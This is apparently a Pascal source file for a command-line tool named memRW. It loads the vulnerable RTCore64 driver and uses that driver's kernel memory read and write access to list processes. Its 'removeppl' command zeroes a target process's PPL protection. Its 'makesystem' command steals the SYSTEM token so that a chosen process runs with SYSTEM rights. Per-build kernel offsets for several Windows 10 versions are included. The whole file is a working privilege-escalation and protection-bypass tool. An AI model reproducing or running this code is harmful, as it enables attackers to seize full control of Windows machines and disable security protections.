{$mode delphi}




//EprocessNext, EprocessFlags2, TokenPrivs, SignatureProtect
//* 10_1703*/{0x02e8, 0x0300, 0x0040, 0x06c8},
//* 10_1709*/{0x02e8, 0x0300, 0x0040, 0x06c8},
//* 10_1803*/{0x02e8, 0x0300, 0x0040, 0x06c8},
//* 10_1809*/{0x02e8, 0x0300, 0x0040, 0x06c8},
//* 10_1903*/{0x02f0, 0x0308, 0x0040, 0x06f8},


program memRW;

uses windows,sysutils, udrv, urtcore, untdll;

type toffsets=record
      EprocessNext:word;
      Token:dword;
      SignatureProtect:dword;
end;



      TByteBits = bitpacked record
        Bit0, Bit1, Bit2, Bit3, Bit4, Bit5, Bit6, Bit7: Boolean;
      end;

       _PS_PROTECTION  =  record
          // High byte of index offset, low byte of index is bit count
         level:uchar;
         bits:byte;
         //Type_	:byte; //index $0003; //: 3;
	 //Audit:byte; //index $0301; //	: 1;
	 //Signer:byte;// index $0701 ; //:4;
end;


_PS_PROTECTED_SIGNER=
(
    PsProtectedSignerNone = 0,
    PsProtectedSignerAuthenticode = 1,
    PsProtectedSignerCodeGen = 2,
    PsProtectedSignerAntimalware = 3,
    PsProtectedSignerLsa = 4,
    PsProtectedSignerWindows = 5,
    PsProtectedSignerWinTcb = 6,
    PsProtectedSignerMax = 7
);

_PS_PROTECTED_TYPE=
(
    PsProtectedTypeNone = 0,
    PsProtectedTypeProtectedLight = 1,
    PsProtectedTypeProtected = 2,
    PsProtectedTypeMax = 3
);


function EnumDeviceDrivers (lpImageBase: PPointer; cb: DWORD;  var lpcbNeeded: DWORD): BOOL stdcall; external 'psapi.dll';

var
         ReleaseID:string;
         targetpid:dword64=0;
         offsets:toffsets;

function getKernelBaseAddr:nativeuint;
var
     out_ :dword= 0;
     nb :DWORD= 0;
     base :array of nativeuint;
     base2 :array[0..4096-1] of pointer;
begin
result:=0;
if EnumDeviceDrivers(@base2[0], sizeof(base2), out_)
    then result:=nativeuint(pointer(base2[0]));
exit;
{
    if EnumDeviceDrivers(nil, 0, nb) then
    begin
        setlength(base,nb);
        writeln(nb);
        if EnumDeviceDrivers(@base[0], nb, out_)
            then result:=nativeuint(pointer(base[0]))
            else result:= 0;
    end else result:= 0;
}
end;

function listprocess(pid:dword64=0;action:byte=0):boolean;
var
device:thandle=thandle(-1);
         b:boolean;
         NtoskrnlBaseAddress:nativeuint ;
         Ntoskrnl:HMODULE;
         PsInitialSystemProcessOffset:DWORD64=0;
         PsInitialSystemProcessAddress:DWORD64=0;
         UniqueProcessId:dword64=0;
         ActiveProcessLinks:dword64=0;
         value:dword64=0;
         next:dword64=0;
         imagefilename:string='';
         protection:dword=0;
         SystemProcessToken:dword64=0;
         CurrentProcessFastToken,CurrentProcessTokenReferenceCounter,CurrentProcessToken:dword64;
begin
//open handle
device:=OpenHandle('\\.\RTCore64');
if device=thandle(-1) then begin writeln('handle failed');exit;end;
//
NtoskrnlBaseAddress:=(getKernelBaseAddr);
WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
// Locating PsInitialSystemProcess address
    Ntoskrnl := LoadLibraryW('ntoskrnl.exe');
    PsInitialSystemProcessOffset := dword64(GetProcAddress(Ntoskrnl, 'PsInitialSystemProcess')) - dword64(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    PsInitialSystemProcessAddress := ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    WriteLn('PsInitialSystemProcessAddress:'+inttohex(PsInitialSystemProcessAddress,sizeof(nativeuint)));
    //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/index.htm
    //offsets : https://github.com/gentilkiwi/mimikatz/blob/68ac65b426d1b9e1354dd0365676b1ead15022de/mimidrv/kkll_m_process.c#L8
    //should be 00000004
    UniqueProcessId := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.EprocessNext-8);
    imagefilename:=ReadMemory16bytes(Device, PsInitialSystemProcessAddress + $450);
    //clear low 4 bits of _EX_FAST_REF structure
    SystemProcessToken := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.Token) and not 15;
    WriteLn('UniqueProcessId:'+inttohex(UniqueProcessId,sizeof(nativeuint))+';'+imagefilename);
    ActiveProcessLinks:= ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.EprocessNext);
    WriteLn('ActiveProcessLinks:'+inttohex(ActiveProcessLinks,sizeof(nativeuint)));
    writeln('*************************');
    next:=ActiveProcessLinks;  //first LIST_ENTRY
    if UniqueProcessId=4 then //safety check
    begin
    while value<>ActiveProcessLinks do
    begin
          UniqueProcessId:=ReadMemoryDWORD64(Device, next-8);
          imagefilename:=ReadMemory16bytes(Device, next-offsets.EprocessNext+$450);
          protection :=ReadMemoryDword(Device, next-offsets.EprocessNext+offsets.SignatureProtect);
          if (UniqueProcessId<4) or (UniqueProcessId>$FFFF) then break;

          if action=0 then writeln(inttohex(next-offsets.EprocessNext,sizeof(nativeuint))+';'+inttostr(UniqueProcessId)+';'+imagefilename+';'+inttohex(protection,sizeof(dword)) );

          //WriteLn('flags :'+inttohex(ReadMemorydword(Device, next-$2E8+$300),4));
          //WriteLn('flags2 :'+inttohex(ReadMemorydword(Device, next-$2E8+$304),4));
          //WriteLn('flags3 :'+inttohex(ReadMemorydword(Device, next-$2E8+$6CC),4));

          //writeln('*************************');

          if UniqueProcessId=targetpid then
             begin
             if action=1 then
                begin
                writeln('patching process protection:'+inttostr(UniqueProcessId ));
                WriteMemoryPrimitive (device,4,next-offsets.EprocessNext+offsets.SignatureProtect,0);  //disable PPL
                //WriteMemoryPrimitive (device,4,next-offsets.EprocessNext+offsets.SignatureProtect,$00623F3F); //enable PPL
                end;
             //https://www.geeksforgeeks.org/bitwise-operators-in-c-cpp/
             //
             if action=2 then
                begin
                writeln('make system');
                CurrentProcessFastToken := ReadMemoryDWORD64(Device, next-offsets.EprocessNext+ offsets.Token);
                CurrentProcessTokenReferenceCounter := CurrentProcessFastToken and 15;
                CurrentProcessToken := CurrentProcessFastToken and not 15;
                WriteMemoryDWORD64(Device, next-offsets.EprocessNext+ offsets.Token, CurrentProcessTokenReferenceCounter or SystemProcessToken);
                end;

             break;
             end;

          next:=ReadMemoryDWORD64(Device, next);
          value:=next;

    end; //while value<>ActiveProcessLinks do

    end; //if UniqueProcessId=4 then
//
if device<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(device),'OK','NOT OK'));
//writeln(BoolToStr (TerminateProcess (process,0)));
end;

function ReadRegEntry(strSubKey,strValueName: string): string;
 var
  Key: HKey;
  Buffer: array[0..255] of char;
  Size: cardinal;
 begin
  Result := 'ERROR';
  Size := SizeOf(Buffer);
  If RegOpenKeyEx(HKEY_LOCAL_MACHINE,
   PChar(strSubKey),0,KEY_READ,Key) = ERROR_SUCCESS Then
    if RegQueryValueEx(Key,PChar(strValueName),nil,nil,
     @Buffer,@Size) = ERROR_SUCCESS then
      Result := Buffer;
  RegCloseKey(Key);
 end;

function SetOffsets:boolean;
begin
 result:=true;
 with offsets do
 begin
 fillchar(offsets,sizeof(offsets),0);
 case strtoint(releaseid) of
 1703:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
 1709:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
 1803:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
 1809:begin    EprocessNext :=$02e8;SignatureProtect :=$06c8; Token :=$358; end;
 1903:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; end;
 1909:begin    EprocessNext :=$02f0;SignatureProtect :=$06f8; Token :=$360; end;
 2004:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
 //20H2:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
 //21H1:begin    EprocessNext :=$0448;SignatureProtect :=$0878; Token :=$4b8; end;
 else result:=false;
 end; //case
 end;//with offsets do
end;

//https://guidedhacking.com/threads/how-to-bypass-kernel-anticheat-develop-drivers.11325/
begin
if paramcount=0 then exit;
ReleaseID:=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','ReleaseID' );
writeln('ReleaseID:'+releaseid);
if SetOffsets =false then begin writeln('Offsets unknown') end;
if (paramcount=2) and (paramstr(1)='load')
   then LoadDriver (ParamStr (2),stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[]));
if (paramcount=2) and (paramstr(1)='unload')
   then UnloadDriver(stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[])) ;
if (paramcount >=1) and (paramstr(1)='list') then
  begin
  listprocess();
  end;
if (paramcount =2) and (paramstr(1)='removeppl') then
  begin
  targetpid:=strtoint64(ParamStr(2));
  listprocess(targetpid,1);
  end;
if (paramcount =2) and (paramstr(1)='makesystem') then
  begin
  targetpid:=strtoint64(ParamStr(2));
  listprocess(targetpid,2);
  end;
end.

